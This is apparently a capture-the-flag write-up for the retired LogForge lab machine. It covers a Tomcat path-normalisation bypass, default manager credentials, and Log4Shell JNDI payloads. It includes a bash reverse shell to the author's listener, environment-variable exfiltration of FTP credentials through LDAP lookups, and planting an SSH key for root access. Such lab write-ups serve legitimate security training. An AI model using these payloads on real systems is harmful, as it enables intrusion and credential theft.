# LogForge

This is the write-up for the box LogForge that got retired at the 23rd December 2022.
My IP address was 10.10.14.7 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.138    logforge.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/logforge.nmap 10.10.11.138
```

```
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
80/tcp   open     http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ultimate Hacking Championship
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp filtered http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The website shows only an image so lets search for hidden directories with **Gobuster**:
```
gobuster -u http://10.10.11.138 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds _manager_ and _admin_, but both result in the HTTP status code _403 Forbidden_.

When browsing to a directory that does not exist, then it shows an HTTP status code _404 Not Found_ and reveals **Apache Tomcat/9.0.31** as the webserver in the footer.

By using the vulnerability in the [talk from BlackHat 2018](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf), it is possible to access restricted paths.

Using the payload on page 48 to access _/manager_:
```
http://10.10.11.138/a/..;/manager/
```

It now asks for authentication and the default credentials of **Tomcat** are working:
```
tomcat:tomcat
```

When trying to deploy a **WAR file** to execute code, it shows an error that the permitted file size is one byte, which will not work.
As **Tomcat** is a Java application, it may use **Log4j** for logging in the background and we can try to exploit the **Log4Shell** vulnerability.

Sending the payload in any field:
```
${jndi:ldap://10.10.14.7:8000/test}
```

After sending the request with the payload in any field, the listener on my IP and port 8000 receives a connection so this vulnerability can be used for code execution.

Creating a payload with [ysoserial-modified](https://github.com/pimps/ysoserial-modified):
```
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1' > logforge_payload.ser
```

Starting the listening server with the [JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit):
```
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -L 10.10.14.7:1389 -P logforge_payload.ser
```

Sending one of the created payloads in any field:
```
${jndi:ldap://10.10.14.7:1389/p7ac94/CustomPayload}
```

After sending the request, the LDAP listener will receive a connection and execute the reverse shell command.
The listener on my IP and port 9001 starts a shell as the user _tomcat_.

## Privilege Escalation

In the initial port scan, the FTP service on port 21 was filtered.
When searching the processes, it shows that it is running a Java application as root:
```
ps -ef | grep -i ftp
```
```
root         987     986  0 15:57 ?        00:00:05 java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
```

Testing if the FTP service is vulnerable to **Log4Shell**:
```
ftp localhost
```
```
220 Welcome to the FTP-Server
Name (localhost:tomcat): ${jndi:ldap://10.10.14.7:8000/test}
```

The listener on my IP and port 8000 receives a connection, so this service is also vulnerable to **Log4Shell**.
Unfortunately this is a custom application, which does not use any of the default gadgets to create a payload with **ysoserial**.

The _jar_ file can be found in the root directory _ftpServer-1.0-SNAPSHOT-all.jar_ and can be analyzed with a decompiler like [JD-GUI](https://java-decompiler.github.io/).

In the main _Worker.class_ it sets two environment variables:
```
private String validUser = System.getenv("ftp_user");

private String validPassword = System.getenv("ftp_password");
```

By sniffing the traffic with **Wireshark**, it should be possible to intercept the values of the variables.

Sending the payload to the FTP service to get the environment variable _ftp_user_:
```
Name (localhost:tomcat): ${jndi:ldap://10.10.14.7:1389/${env:ftp_user}}
```
```
ippsec
```

Sending the payload to the FTP service to get the environment variable _ftp_password_:
```
Name (localhost:tomcat): ${jndi:ldap://10.10.14.7:1389/${env:ftp_password}}
```
```
log4j_env_leakage
```

The credentials work and it is possible to login to the FTP service.
The FTP service is in the home folder of root and it is possible to upload an SSH key in _/root/.ssh/authorized_keys2_.

Creating _authorized_keys2_ in the folder with our generated public SSH key:
```
ftp> cd .ssh
ftp> put authorized_keys2
```

Login with root via SSH:
```
ssh -i logforge_root.key root@10.10.11.138
```
